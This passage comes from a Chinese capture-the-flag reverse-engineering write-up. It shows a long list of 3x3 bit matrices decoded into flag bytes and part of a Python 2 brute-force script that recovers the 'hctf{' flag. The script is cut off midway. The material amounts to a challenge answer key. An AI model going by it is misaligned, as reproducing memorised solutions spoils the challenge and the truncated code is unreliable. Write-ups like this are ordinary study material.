plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number5 index4 alt2"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number6 index5 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number7 index6 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;1,&nbsp;0]]</code></div><div class="line number8 index7 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;1]]</code></div><div class="line number9 index8 alt2"><code class="plain plain">[[1,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number10 index9 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number11 index10 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number12 index11 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number13 index12 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number14 index13 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number15 index14 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;0,&nbsp;0]]</code></div><div class="line number16 index15 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number17 index16 alt2"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number18 index17 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number19 index18 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;0,&nbsp;0]]</code></div><div class="line number20 index19 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number21 index20 alt2"><code class="plain plain">[[1,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number22 index21 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number23 index22 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;0,&nbsp;0]]</code></div><div class="line number24 index23 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number25 index24 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number26 index25 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number27 index26 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;1,&nbsp;0]]</code></div><div class="line number28 index27 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number29 index28 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number30 index29 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number31 index30 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;1,&nbsp;0]]</code></div><div class="line number32 index31 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number33 index32 alt2"><code class="plain plain">[[1,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number34 index33 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number35 index34 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number36 index35 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number37 index36 alt2"><code class="plain plain">[[1,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number38 index37 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number39 index38 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;1,&nbsp;0]]</code></div><div class="line number40 index39 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;1]]</code></div><div class="line number41 index40 alt2"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number42 index41 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number43 index42 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;0,&nbsp;0]]</code></div><div class="line number44 index43 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number45 index44 alt2"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number46 index45 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number47 index46 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;0,&nbsp;0]]</code></div><div class="line number48 index47 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number49 index48 alt2"><code class="plain plain">[[1,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number50 index49 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number51 index50 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number52 index51 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number53 index52 alt2"><code class="plain plain">[[1,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number54 index53 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number55 index54 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number56 index55 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;1]]</code></div><div class="line number57 index56 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number58 index57 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number59 index58 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;1,&nbsp;0]]</code></div><div class="line number60 index59 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number61 index60 alt2"><code class="plain plain">[[1,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number62 index61 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number63 index62 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;0,&nbsp;0]]</code></div><div class="line number64 index63 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number65 index64 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number66 index65 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number67 index66 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;1,&nbsp;0]]</code></div><div class="line number68 index67 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number69 index68 alt2"><code class="plain plain">[[1,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number70 index69 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number71 index70 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;1,&nbsp;0]]</code></div><div class="line number72 index71 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number73 index72 alt2"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number74 index73 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number75 index74 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;1,&nbsp;0]]</code></div><div class="line number76 index75 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number77 index76 alt2"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number78 index77 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number79 index78 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;1,&nbsp;0]]</code></div><div class="line number80 index79 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;1]]</code></div><div class="line number81 index80 alt2"><code class="plain plain">[[1,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number82 index81 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number83 index82 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number84 index83 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number85 index84 alt2"><code class="plain plain">[[1,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number86 index85 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number87 index86 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number88 index87 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number89 index88 alt2"><code class="plain plain">[[1,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number90 index89 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number91 index90 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;1,&nbsp;0]]</code></div><div class="line number92 index91 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;1,&nbsp;0]]</code></div><div class="line number93 index92 alt2"><code class="plain plain">[[1,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number94 index93 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number95 index94 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;0,&nbsp;0]]</code></div><div class="line number96 index95 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;1]]</code></div><div class="line number97 index96 alt2"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number98 index97 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;1],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number99 index98 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;0,&nbsp;0]]</code></div><div class="line number100 index99 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number101 index100 alt2"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number102 index101 alt1"><code class="plain plain">[[0,&nbsp;1,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div><div class="line number103 index102 alt2"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[1,&nbsp;0,&nbsp;0]]</code></div><div class="line number104 index103 alt1"><code class="plain plain">[[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0],&nbsp;[0,&nbsp;0,&nbsp;0]]</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">每四个组确定两个半字节，相当于一个字节，一共104组可以获得26字节，加上前面的6字节获得全部32字节</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后就是去推出，输入的forward_char和back_char了，由于限制在0f之中所以使用爆破的方式</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">脚本如下</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">init&nbsp;=&nbsp;[2,&nbsp;0,&nbsp;128,&nbsp;128,&nbsp;2,&nbsp;6,&nbsp;192,&nbsp;256,&nbsp;3,&nbsp;6,&nbsp;128,&nbsp;0,&nbsp;0,&nbsp;6,&nbsp;64,&nbsp;0,&nbsp;2,&nbsp;4,&nbsp;64,&nbsp;0,&nbsp;1,&nbsp;2,&nbsp;64,&nbsp;0,&nbsp;0,&nbsp;6,&nbsp;192,&nbsp;0,&nbsp;0,&nbsp;6,&nbsp;192,&nbsp;0,&nbsp;3,&nbsp;2,&nbsp;128,&nbsp;128,&nbsp;3,&nbsp;6,&nbsp;192,&nbsp;256,&nbsp;2,&nbsp;4,&nbsp;64,&nbsp;128,&nbsp;2,&nbsp;4,&nbsp;64,&nbsp;0,&nbsp;1,&nbsp;4,&nbsp;128,&nbsp;0,&nbsp;3,&nbsp;2,&nbsp;128,&nbsp;256,&nbsp;0,&nbsp;4,&nbsp;192,&nbsp;0,&nbsp;3,&nbsp;2,&nbsp;64,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;192,&nbsp;0,&nbsp;3,&nbsp;6,&nbsp;192,&nbsp;0,&nbsp;2,&nbsp;0,&nbsp;192,&nbsp;128,&nbsp;2,&nbsp;6,&nbsp;192,&nbsp;256,&nbsp;3,&nbsp;6,&nbsp;128,&nbsp;0,&nbsp;1,&nbsp;2,&nbsp;0,&nbsp;0,&nbsp;1,&nbsp;6,&nbsp;192,&nbsp;128,&nbsp;3,&nbsp;0,&nbsp;64,&nbsp;256,&nbsp;2,&nbsp;6,&nbsp;64,&nbsp;0,&nbsp;2,&nbsp;2,&nbsp;64,&nbsp;0]</code></div><div class="line number2 index1 alt1"><code class="plain plain">key&nbsp;=&nbsp;[0,0,0,0]</code></div><div class="line number3 index2 alt2"><code class="plain plain">list1&nbsp;=&nbsp;[0,1,6,7]</code></div><div class="line number4 index3 alt1"><code class="plain plain">list2&nbsp;=&nbsp;[1,2,7,8]</code></div><div class="line number5 index4 alt2"><code class="plain plain">#tmp&nbsp;=&nbsp;['h','c','t','f','{']</code></div><div class="line number6 index5 alt1"><code class="plain plain">list3&nbsp;=&nbsp;[None]*52</code></div><div class="line number7 index6 alt2"><code class="plain plain">list3[0]&nbsp;=&nbsp;ord('h')&amp;0x0f</code></div><div class="line number8 index7 alt1"><code class="plain plain">list3[1]&nbsp;=&nbsp;(ord('h')&amp;0xF0)&gt;&gt;4</code></div><div class="line number9 index8 alt2"><code class="plain plain">list3[2]&nbsp;=&nbsp;ord('c')&amp;0x0f</code></div><div class="line number10 index9 alt1"><code class="plain plain">list3[3]&nbsp;=&nbsp;(ord('c')&amp;0xF0)&gt;&gt;4</code></div><div class="line number11 index10 alt2"><code class="plain plain">list3[4]&nbsp;=&nbsp;ord('t')&amp;0x0f</code></div><div class="line number12 index11 alt1"><code class="plain plain">list3[5]&nbsp;=&nbsp;(ord('t')&amp;0xF0)&gt;&gt;4</code></div><div class="line number13 index12 alt2"><code class="plain plain">list3[6]&nbsp;=&nbsp;ord('f')&amp;0x0f</code></div><div class="line number14 index13 alt1"><code class="plain plain">list3[7]&nbsp;=&nbsp;(ord('f')&amp;0xF0)&gt;&gt;4</code></div><div class="line number15 index14 alt2"><code class="plain plain">list3[8]&nbsp;=&nbsp;ord('{')&amp;0x0f</code></div><div class="line number16 index15 alt1"><code class="plain plain">list3[9]&nbsp;=&nbsp;(ord('{')&amp;0xF0)&gt;&gt;4</code></div><div class="line number17 index16 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number18 index17 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number19 index18 alt2"><code class="plain plain">print&nbsp;len(init)</code></div><div class="line number20 index19 alt1"><code class="plain plain">for&nbsp;k&nbsp;in&nbsp;range(26):</code></div><div class="line number21 index20 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">for&nbsp;i&nbsp;in&nbsp;range(256):</code></div><div class="line number22 index21 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">for&nbsp;l&nbsp;in&nbsp;range(4):</code></div><div class="line number23 index22 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">z&nbsp;=&nbsp;0</code></div><div class="line number24 index23 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">v8&nbsp;=&nbsp;(i&amp;0xF0)&gt;&gt;4</code></div><div class="line number25 index24 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;(k&lt;10):</code></div><div class="line number26 index25 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">v7&nbsp;=&nbsp;list3[k]&amp;0x0F</code></div><div class="line number27 index26 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">else&nbsp;:</code></div><div class="line number28 index27 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">v7&nbsp;=&nbsp;(i&amp;0x0F)</code></div><div class="line number29 index28 alt2"><code 